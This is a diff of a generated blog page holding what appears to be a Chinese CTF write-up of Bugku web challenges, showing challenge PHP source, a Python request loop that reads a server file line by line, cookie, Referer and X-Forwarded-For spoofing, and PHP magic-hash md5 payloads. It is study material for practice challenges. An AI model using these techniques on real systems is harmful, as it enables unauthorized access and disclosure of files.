@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -254,7 +254,7 @@
 
 <h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><p>打开页面查看源码什么也没有</p>
 <p>抓包看了看，惊喜的发现了flag字段</p>
-<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/K7zFInPiQEkjvY6.png" srcset="/img/loading.gif"></p>
 <p>一段base64 解码后为<code>NDQyMDIy</code></p>
 <p>提交发现并不对。。。看来另有玄机</p>
 <p>多go几次后发现了flag值一直在变，并且有一段提示</p>
@@ -275,7 +275,7 @@ data=&#123;<span class="hljs-string">&#x27;margin&#x27;</span>:flag&#125;
 
 <p><img src="https://i.loli.net/2020/11/30/7ydLFG96krwuQDn.png" srcset="/img/loading.gif" alt="headers.png"></p>
 <h2 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h2><p>注意观察url<code>http://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ=</code></p>
-<p>line=2&amp;filename=a2V5cy50eHQ=</p>
+<p>line&#x3D;2&amp;filename&#x3D;a2V5cy50eHQ&#x3D;</p>
 <p><code>a2V5cy50eHQ=</code> 解密是为key.txt   line是行的意思，这里应该是查看key.txt的第line行的代码</p>
 <p>这里可以查看<code>index.php</code>源码  index.php的base64值为<code>aW5kZXgucGhw</code></p>
 <p><img src="https://i.loli.net/2020/11/30/k7VDufCye3x4WAE.png" srcset="/img/loading.gif" alt="cookie1.png"></p>
@@ -286,20 +286,20 @@ url2 = <span class="hljs-string">&quot;&amp;filename=aW5kZXgucGhw&quot;</span>
 mysession = requests.session()
 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">40</span>):    
     r = mysession.get(url1+<span class="hljs-built_in">str</span>(i)+url2)    
-print(r.text)
+<span class="hljs-built_in">print</span>(r.text)
 
 
 </code></pre></div>
 
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
 
-<span class="hljs-variable">$file</span>=base64_decode(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);
+<span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]:<span class="hljs-string">&quot;&quot;</span>);
 
-<span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;
+<span class="hljs-variable">$line</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>])?<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;line&#x27;</span>]):<span class="hljs-number">0</span>;
 
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) header(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>==<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);
 
 <span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>(
 
@@ -319,9 +319,9 @@ error_reporting(<span class="hljs-number">0</span>);
 
  
 
-<span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$file_list</span>))&#123;
 
-<span class="hljs-variable">$fa</span> = file(<span class="hljs-variable">$file</span>);
+<span class="hljs-variable">$fa</span> = <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$file</span>);
 
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fa</span>[<span class="hljs-variable">$line</span>];
 
@@ -332,10 +332,10 @@ error_reporting(<span class="hljs-number">0</span>);
 
 
 <p><code>if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;)</code></p>
-<p> 这里可以判断cookie必须满足margin=margin才能访问keys.php</p>
+<p> 这里可以判断cookie必须满足margin&#x3D;margin才能访问keys.php</p>
 <p><img src="https://i.loli.net/2020/11/30/5c9Ip8Rgn2xL4iS.png" srcset="/img/loading.gif" alt="bp"></p>
 <h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h2><p>查看源码提示了</p>
-<p><code>&lt;!--1p.html--&gt;</code>     </p>
+<p><code>&lt;!--1p.html--&gt;</code> 	</p>
 <p>直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64</p>
 <div class="hljs"><pre><code class="hljs gcode">JTIyJT<span class="hljs-symbol">NCaWYlMjglMjElMjRfR0</span>VUJT<span class="hljs-attr">VCJTI3</span>aWQlMjcl<span class="hljs-symbol">NUQlMjklMEElN0</span>IlMEElMDloZWFkZXIlMjglMjdMb<span class="hljs-number">2</span><span class="hljs-symbol">NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4</span>aXQlMjglMjkl<span class="hljs-name">M0</span>IlMEEl<span class="hljs-symbol">N0</span>QlMEElMjRpZCUzRCUy<span class="hljs-symbol">NF9</span>HRVQl<span class="hljs-symbol">NUIlMjdpZCUyNyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGElM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YSUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQSUy<span class="hljs-symbol">NGIlM0</span>QlMjRfR<span class="hljs-number">0</span>VUJT<span class="hljs-attr">VCJTI3</span>YiUy<span class="hljs-symbol">NyU1</span>RCUzQiUwQWlmJTI<span class="hljs-number">4</span>c<span class="hljs-number">3</span>RyaXB<span class="hljs-attr">vcyUyOCUyNGElMkMlMjcuJTI3</span>JTI<span class="hljs-number">5</span>JTI<span class="hljs-number">5</span>JTBBJTdCJTBBJTA<span class="hljs-number">5</span>ZW<span class="hljs-symbol">NobyUyMCUyN25</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTIwb<span class="hljs-name">m8</span>lMjBubyUyM<span class="hljs-name">G5</span>vJTI<span class="hljs-number">3</span>JT<span class="hljs-symbol">NCJTBBJTA5</span>cmV<span class="hljs-number">0</span>dXJuJTIwJT<span class="hljs-symbol">NCJTBBJTdEJTBBJTI0</span>ZGF<span class="hljs-number">0</span>YSUyMCUzRCUyMEBmaWxlX<span class="hljs-number">2</span>dldF<span class="hljs-number">9</span>jb<span class="hljs-number">250</span>ZW<span class="hljs-number">50</span>cyUyOCUy<span class="hljs-symbol">NGElMkMlMjdyJTI3</span>JTI<span class="hljs-number">5</span>JT<span class="hljs-symbol">NCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3</span>UlMjBpcyUyMGElMjBuaW<span class="hljs-symbol">NlJTIwcGxhdGVmb3</span>JtJTIxJTIyJTIwYW<span class="hljs-number">5</span>kJTIwJTI<span class="hljs-number">0</span>aWQl<span class="hljs-name">M0</span>Ql<span class="hljs-name">M0</span>QwJTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>RybGVuJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyOSUzRTUlMjBhbmQlMjBlcmV<span class="hljs-symbol">naSUyOCUyMjExMSUyMi5</span>zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE<span class="hljs-number">0</span>JTIyJTI<span class="hljs-number">5</span>JTIwYW<span class="hljs-number">5</span>kJTIwc<span class="hljs-number">3</span>Vic<span class="hljs-number">3</span>RyJTI<span class="hljs-number">4</span>JTI<span class="hljs-number">0</span>YiUyQzAlMkMxJTI<span class="hljs-number">5</span>JTIxJT<span class="hljs-symbol">NENCUyOSUwQSU3</span>QiUwQSUwOXJlcXVpcmUlMjglMjJm<span class="hljs-symbol">NGwyYTNnLnR4</span>dCUyMiUyOSUzQiUwQSU<span class="hljs-number">3</span>RCUwQW<span class="hljs-attr">Vsc2</span>UlMEEl<span class="hljs-symbol">N0</span>IlMEElMDlwcmludCUyMCUyM<span class="hljs-name">m5</span>ldmVyJTIwbmV<span class="hljs-number">2</span>ZXIlMjBuZXZlciUyMGdpdmUlMjB<span class="hljs-number">1</span>cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU<span class="hljs-number">3</span>RCUwQSUwQSUwQSUzRiUzRQ</code></pre></div>
 
@@ -343,23 +343,23 @@ error_reporting(<span class="hljs-number">0</span>);
 <div class="hljs"><pre><code class="hljs llvm"><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bif<span class="hljs-variable">%28</span><span class="hljs-variable">%21</span><span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>header<span class="hljs-variable">%28</span><span class="hljs-variable">%27</span>Location<span class="hljs-variable">%3</span>A<span class="hljs-variable">%20</span>hello.php<span class="hljs-variable">%3</span>Fid<span class="hljs-variable">%3</span>D<span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>exit<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>id<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>a<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>b<span class="hljs-variable">%3</span>D<span class="hljs-variable">%24</span>_GET<span class="hljs-variable">%5</span>B<span class="hljs-variable">%27</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span>stripos<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>.<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>echo<span class="hljs-variable">%20</span><span class="hljs-variable">%27</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%20</span>no<span class="hljs-variable">%27</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%24</span>data<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%20</span><span class="hljs-title">@file_get_contents</span><span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span>C<span class="hljs-variable">%27</span>r<span class="hljs-variable">%27</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>Aif<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>data<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-variable">%22</span>bugku<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>a<span class="hljs-variable">%20</span>nice<span class="hljs-variable">%20</span>plateform<span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>id<span class="hljs-variable">%3</span>D<span class="hljs-variable">%3</span>D<span class="hljs-number">0</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>strlen<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>E<span class="hljs-number">5</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>eregi<span class="hljs-variable">%28</span><span class="hljs-variable">%22111</span><span class="hljs-variable">%22</span>.substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span>C<span class="hljs-variable">%221114</span><span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>substr<span class="hljs-variable">%28</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span>C<span class="hljs-number">0</span><span class="hljs-variable">%2</span>C<span class="hljs-number">1</span><span class="hljs-variable">%29</span><span class="hljs-variable">%21</span><span class="hljs-variable">%3</span>D<span class="hljs-number">4</span><span class="hljs-variable">%29</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>require<span class="hljs-variable">%28</span><span class="hljs-variable">%22</span>f<span class="hljs-number">4</span>l<span class="hljs-number">2</span>a<span class="hljs-number">3</span>g.txt<span class="hljs-variable">%22</span><span class="hljs-variable">%29</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>Aelse<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%09</span>print<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>never<span class="hljs-variable">%20</span>give<span class="hljs-variable">%20</span>up<span class="hljs-variable">%20</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%0</span>A<span class="hljs-variable">%7</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E</code></pre></div>
 
 <p>url解码为源码</p>
-<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/qpmSYCjHZGeRD8F.png" srcset="/img/loading.gif"></p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-f(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])
+<span class="hljs-title function_ invoke__">f</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])
 &#123;
-	header(<span class="hljs-string">&#x27;Location: hello.php?id=1&#x27;</span>);
+	<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: hello.php?id=1&#x27;</span>);
 	<span class="hljs-keyword">exit</span>();
 &#125;
 <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
 <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
 <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];
-<span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))
 &#123;
 	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no no no no no&#x27;</span>;
 	<span class="hljs-keyword">return</span> ;
 &#125;
-<span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);
-<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">&quot;111&quot;</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
+<span class="hljs-variable">$data</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;bugku is a nice plateform!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">eregi</span>(<span class="hljs-string">&quot;111&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)
 &#123;
 	<span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;f4l2a3g.txt&quot;</span>); <span class="hljs-comment">//注意这里，flag应该藏在这里</span>
 &#125;
@@ -371,13 +371,13 @@ f(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>果然藏在f4l2a3g.txt</p>
-<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/30/ObAgHyeFnp9QM1G.png" srcset="/img/loading.gif"></p>
 <h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><p>此站没有flag，flag被人删了，不用再做了。–一个做题的路人</p>
 <p>flag好像真的被删了，列不出来目录，查看wp也没有复现。</p>
 <h2 id="正则？字符？"><a href="#正则？字符？" class="headerlink" title="正则？字符？"></a>正则？字符？</h2><div class="hljs"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> 
-highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;2.php&#x27;</span>);
 <span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;KEY&#123;********************************&#125;&#x27;</span>;
-<span class="hljs-variable">$IM</span>= preg_match(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);
+<span class="hljs-variable">$IM</span>= <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]), <span class="hljs-variable">$match</span>);
 <span class="hljs-keyword">if</span>( <span class="hljs-variable">$IM</span> )&#123; 
  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;key is: &#x27;</span>.<span class="hljs-variable">$key</span>);
 &#125;</code></pre></div>
@@ -387,14 +387,14 @@ highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
 <p><code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</code></p>
 <p>重点在这句话上，考点为正则表达式</p>
 <blockquote>
-<p><strong>定界符：</strong>/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
+<p><strong>定界符：</strong>&#x2F;和&#x2F;（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）；</p>
 <p><strong>. （一个点）：</strong>表示可以匹配任何字符；</p>
-<p><strong>*  ：</strong>前面的字符重复零次或多次；</p>
+<p>***  ：**前面的字符重复零次或多次；</p>
 <p><strong>{n,m} ：</strong>前面的字符重复4~7次；</p>
 <p><strong>\ （反斜线）：</strong>后面的字符被转义；</p>
 <p><strong>[a-z] ：</strong>在a到z中匹配 ；</p>
 <p><strong>[[:punct:]] ：</strong>匹配任何标点符号；</p>
-<p><strong>/i ：</strong>表示这个正则表达式对大小写不敏感；</p>
+<p><strong>&#x2F;i ：</strong>表示这个正则表达式对大小写不敏感；</p>
 </blockquote>
 <p>因此可以写出符合要求的字符穿</p>
 <div class="hljs"><pre><code class="hljs arcade">keyakey22222key:<span class="hljs-regexp">/a/</span>aaakeyb!</code></pre></div>
@@ -404,13 +404,13 @@ highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
 <h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><p>题目提示 are you from google?</p>
 <p>你是从google来的吗</p>
 <p>考察http头中的referer参数</p>
-<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>例如：Referer：<a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com/</a></strong> </p>
+<p><strong>Referer：浏览器向 WEB 服务器表明自己是从哪个 网页&#x2F;URL 获得&#x2F;点击 当前请求中的网址&#x2F;URL。<br>例如：Referer：<a target="_blank" rel="noopener" href="http://www.sina.com/">http://www.sina.com/</a></strong> </p>
 <p>那么就抓包修改referer这个参数</p>
 <p><code>Referer: https://www.google.com/</code>,直接go即可</p>
 <h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>源码</p>
-<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$md51</span> = md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$md51</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>);
 <span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];
-<span class="hljs-variable">$md52</span> = @md5(<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$md52</span> = @<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>);
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>))&#123;
 <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-variable">$md51</span> == <span class="hljs-variable">$md52</span>) &#123;
     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nctf&#123;*****************&#125;&quot;</span>;
@@ -420,7 +420,7 @@ highlight_file(<span class="hljs-string">&#x27;2.php&#x27;</span>);
 <span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please input a&quot;</span>;&#125;</code></pre></div>
 
 <p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
-<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
 <p>常见的payload有</p>
 <div class="hljs"><pre><code class="hljs stylus">QNKCDZO
 <span class="hljs-number">240610708</span>
@@ -428,7 +428,7 @@ s878926199a
 s155964671a
 s214587387a
 s214587387a
- sha1(str)
+ <span class="hljs-built_in">sha1</span>(str)
 <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaroZmOk&#x27;</span>)</span></span>  
 <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaK1STfY&#x27;</span>)</span></span>
 <span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">&#x27;aaO8zKZF&#x27;</span>)</span></span>
@@ -437,20 +437,20 @@ s214587387a
 
 
 <h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><p>见到题目就想到了<code>x-forwarded-for</code>，本地地址可以使用IP:127.0.0.1</p>
-<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif" alt></p>
-<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif" alt></p>
-<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif" alt></p>
+<p>可以使用google浏览器的插件<img src="https://i.loli.net/2020/11/30/idlumxHC5tWKwvI.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2020/11/30/jswkU98VvSIgEJK.png" srcset="/img/loading.gif"></p>
+<p><img src="https://i.loli.net/2020/11/30/gE2JADOYGnLIloj.png" srcset="/img/loading.gif"></p>
 <h2 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h2><p>题目源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
-<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
+<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);
+<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
 <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;
 <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;
